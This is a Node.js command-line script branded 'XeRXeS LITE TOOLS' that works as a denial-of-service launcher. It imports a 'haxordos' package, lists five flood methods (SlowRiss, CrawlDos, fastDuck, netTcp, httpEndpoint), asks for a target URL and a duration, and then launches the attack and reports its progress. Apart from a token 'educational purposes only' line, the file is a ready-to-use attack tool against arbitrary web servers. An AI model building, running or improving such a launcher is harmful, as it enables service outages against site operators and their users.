const hacxorDos = require('haxordos');
const yellow = '\x1b[33m';
const red = '\x1b[31m';
const green = '\x1b[32m';
const cyan = '\x1b[36m';
const magenta = '\x1b[35m';
const blue = '\x1b[34m';
const reset = '\x1b[0m';
const gradient = require('gradient-string');


function showTitle() {

process.stdout.write('\x1Bc');
console.log(gradient.atlas(`
 ⢀⣤⡄                  ⣀⡀  ⢀⡀                  ⢀   
⢠⡟⣹⣇            ⢀⣤⣶⣶⣶⠿⠛⣧⡀⣀⣾⠛⢿⣶⣤⣤⣄             ⢸⡿⣦ 
⢸⣵⣿⣻⣧⡀        ⣀⣴⣿⠋⠁⠈⠁  ⠙⠿⠿⠃  ⠈⠉⠉⠻⣷⣄          ⣰⣿⣶⢹⡇
⠈⢿⣧⡶⣛⠿⣷⣦⣤⣤⣤⣤⣤⣾⠿⠋⠁                ⠘⠻⣿⣦⣤⣤⣄⣀⣀⣠⣤⣾⠿⣏⢻⡿⠃
 ⠘⢿⣿⡇⣶⣵⢞⣹⣏⠞⠁⡾⠃                      ⠻⡏⠙⣟⢿⡻⣏⡳⣌⢳⣿⣾⠃ 
   ⠙⢿⡿⣿⣾⣇⡏⢀⡞⠁                        ⠹⣆⠈⣾⢹⣶⣷⣿⡼⠟⠁  
    ⠈⠛⢧⣭⣛⢿⣾⣇           ⡄  ⣄           ⣼⣰⣿⢿⣻⣽⠿⠃    
       ⠈⠙⠿⣯⣻⡄⣤⢤⡀       ⣇  ⣿       ⢀⣀⣀⣴⢟⣿⡾⠟⠉       
       ⢠⣆ ⠈⣿⡙⣇⡴⣶⡀     ⢀⣿⣦⣼⡇⡀      ⠯⣌⡿⢻⡟⠁ ⣤        
       ⣿⠟⢷⣶⡿⢺⣿⡟⠉⠙⠛⣛⠦  ⠸⣌⠛⢋⡽⠃ ⠠⢶⠶⡾⠛⠻⣾⣿⠿⣧⣤⣴⢿⡆       
      ⠸⣿⣴⡟⢾⣧⡴⢟⣠⣾⣿⣷⣾⣇   ⢹⡀⢸⠁  ⢀⣾⣶⣿⣷⣤⠸⣧⣤⣿⠭⣦⣸⣷       
       ⡏⢸⡇⠈ ⣷⣸⣿⣿⠸⣏⠿⣻⣷⣄ ⣼⡇⣹⡄ ⣰⣿⠿⢟⡿⢹⣿⣿⢷⡧⠙⠆⣿⠘⡷       
       ⢻⡌⢷⡀ ⠈⠙⢿⣾⡳⠌⠁ ⠨⢿⡿⠟⠻⠛⠿⡿⢯⡉⠁⠉⠠⣞⣿⡟⠛⠁ ⣠⡟⣸⠇       
        ⠙⢦⣹⣤⡤⠤ ⠉⠉⠉⠉⣠⡴⣿⠁    ⢹⣦⣤⡉⠓⠚⠛⠋⠠⣀⣀⣰⣋⡴⠋        
         ⢸⠁⣸⣿⣿⣟⠶⠶⠴⠚⣏⠰⣿⣁⡀  ⣀⣯⣵⣈⡗⢦⣤⡴⢶⣶⣶⣦⠉⣿          
      ⡀⢀⣀⣼⣿⠏⠉⠉⠻⣿⣶⣤⣄⣈⣀⣢⣴⣄ ⢀⣤⣾⣁⣈⣀⣠⣤⣶⡿⠛⠉⠻⣷⣟⡀         
      ⠉⠛⠿⣿⣷⣤⣤⠴⠂⡿⢹⡿⢿⣿⣿⣭⣩⣽⣻⣿⣍⣹⣿⣿⣿⢿⣿⢻⡇⢤⣄⣀⣸⣿⣿⡷⠖       
          ⠈⠉  ⠘⠁⠸⠇⢸⣿⢁⣙⣿⠋⠛⠙⣿⡿⣉⢻⡇⠈⣿ ⠃ ⠈⠙⠛⠋⠁         
                 ⢀⣾⣿⠋⢹⢻   ⡼⢹⠙⣿⣿⡀                  
                ⠈⠉⠉⠁ ⢸     ⡎ ⠈⠙⠛⠒                 
                     ⢿⣠⡞ ⢰⣄⣿                      
                    ⢀⣾⠃⣿⣶⣿⠟⣷⡀                     
                   ⢰⣿⢻⣄⣯⣠⣽⣀⡟⣿⡄                    
                    ⠛⠲⣍ ⠈⠉⣩⡶⠛⠁                    
                      ⠹⣧⣤⣴⡏                       
                       ⠉⠉⠉                        
`));
console.log(red + '\n╔══════════════════════════════════════╗');
console.log(red + '║' + yellow + '           XeRXeS LITE TOOLS          ' + red + '║');
console.log(red + '╚══════════════════════════════════════╝\n' + reset);
}


function typeText(text, delay = 50) {
return new Promise((resolve) => {
let i = 0;
const typeInterval = setInterval(() => {
process.stdout.write(text[i]);
i++;
if (i >= text.length) {
clearInterval(typeInterval);
console.log();
resolve();
}
}, delay);
});
}


async function showMenuOptions() {

const menuOptions = [
`${yellow}[${red}1${yellow}]${reset}${green} SlowRiss${reset}`,
`${yellow}[${red}2${yellow}]${reset}${green} CrawlDos${reset}`,
`${yellow}[${red}3${yellow}]${reset}${green} fastDuck${reset}`,
`${yellow}[${red}4${yellow}]${reset}${green} netTcp${reset}`,
`${yellow}[${red}5${yellow}]${reset}${green} httpEndpoint${reset}`
];


console.log(yellow + 'Available Methods:' + reset);
for (const option of menuOptions) {
await typeText(option);
await new Promise(resolve => setTimeout(resolve, 100));
}
console.log();
}

function executeAttack(methodNum, url, time) {
const getUrl = url;
const duration = parseInt(time);
console.log(green + `🚀 Starting ${getMethodName(methodNum)} attack on ${url} for ${time} seconds...` + reset);


try {
switch(methodNum) {
case 1:
hacxorDos.SlowRiss(getUrl, duration);
break;
case 2:
hacxorDos.CrawlDos(getUrl, duration);
break;
case 3:
hacxorDos.fastDuck(getUrl, duration);
break;
case 4:
hacxorDos.netTcp(getUrl, duration);
break;
case 5:
hacxorDos.httpEndpoint(getUrl, duration);
break;
default:
console.log(red + 'Invalid method selected!' + reset);
return;
}

console.log(green + `✅ ${getMethodName(methodNum)} attack launched successfully!` + reset);
let secondsElapsed = 0;
const progressInterval = setInterval(() => {
secondsElapsed++;
const progress = (secondsElapsed / duration) * 100;
process.stdout.write(`\r${cyan}Progress: ${secondsElapsed}s/${time}s (${progress.toFixed(1)}%)${reset}`);
if (secondsElapsed >= duration) {
clearInterval(progressInterval);
console.log(`\n${green}✅ Attack completed!${reset}`);
}
}, 1000);
} catch (error) {
console.log(red + `❌ Error executing attack: ${error.message}` + reset);
}
}


const readline = require('readline');
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});


async function showMenu() {
await showMenuOptions();
rl.question(cyan + 'Methods <1-5> : ' + reset, (method) => {
const methodNum = parseInt(method);
if (methodNum >= 1 && methodNum <= 5) {
rl.question(cyan + 'Target URL : ' + reset, (url) => {
if (!url.startsWith('http://') && !url.startsWith('https://')) {
url = 'http://' + url;
}
rl.question(cyan + 'Time (seconds) : ' + reset, (time) => {
const timeNum = parseInt(time);
if (isNaN(timeNum) || timeNum <= 0) {
console.log(red + 'Invalid time! Please enter a positive number.' + reset);
rl.close();
return;
}
console.log(gradient.morning(`
╔═══════════════════════════════════╗
║            ATTACK STARTED         ║
╚═══════════════════════════════════╝
`));
console.log(magenta + `TARGET: ${url}` + reset);
console.log(magenta + `TIME: ${time} seconds` + reset);
console.log(magenta + `METHOD: ${getMethodName(methodNum)}` + reset);
console.log(magenta + `TIMESTAMP: ${new Date().toLocaleString()}` + reset);
console.log(red + '\n⚠️  WARNING: This tool is for educational purposes only!' + reset);
console.log(red + '   Use responsibly and legally!\n' + reset);
executeAttack(methodNum, url, timeNum);
rl.close();
});
});
} else {
console.log(red + 'Invalid choice! Please select between 1-5!' + reset);
showMenu();
}
});
}

function getMethodName(methodNum) {
const methods = { 1: 'SlowRiss',2: 'CrawlDos',3: 'fastDuck',4: 'netTcp',5: 'httpEndpoint' };
return methods[methodNum] || 'Unknown';
}
showTitle();
showMenu();
